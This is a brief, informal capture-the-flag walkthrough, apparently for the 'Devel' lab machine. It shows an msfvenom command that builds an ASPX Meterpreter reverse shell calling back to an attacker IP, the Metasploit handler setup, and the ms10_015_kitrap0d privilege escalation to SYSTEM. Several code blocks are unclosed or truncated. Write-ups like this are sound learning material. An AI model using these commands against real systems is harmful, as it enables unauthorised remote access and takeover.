# Devel (Not trad Windows)

So this box we saw that we could access FTP and could put files in soâ€¦.

using msfvenom

```bash
/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.125 LPORT=4444 -f aspx -o payload2.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2880 bytes
Saved as: payload2.aspx

```

We created a payload that we could upload and use msfconsole to access!

```bash
use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

We set the exploit and payload to connect

from here i messed about a lil but the point is we need to background the session so we can do further recon

```bash
(Meterpreter 2)(c:\Users) > sessions 1
[*] Backgrounding session 2...
[-] Invalid session identifier: 1
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> sessions -i

Active sessions
===============

  Id  Name  Type                     Information              Connection

Once backgrounded we can then see suggestions on post exploitation because this was a windows 7 box there was a tonne

```bash
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> search suggest

decided to use number 3 as its first validated working

```bash
[*] Post module execution completed
[msf](Jobs:0 Agents:1) auxiliary(scanner/http/nagios_xi_scanner) >> use exploit/windows/local/ms10_015_kitrap0d
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(windows/local/ms10_015_kitrap0d) >> show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     83.136.252.171   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

then it got the system!

```bash
[msf](Jobs:0 Agents:1) exploit(windows/local/ms10_015_kitrap0d) >> run

BOOM root access very cool box to teach me about msfvenom and reverse tcp,cool!
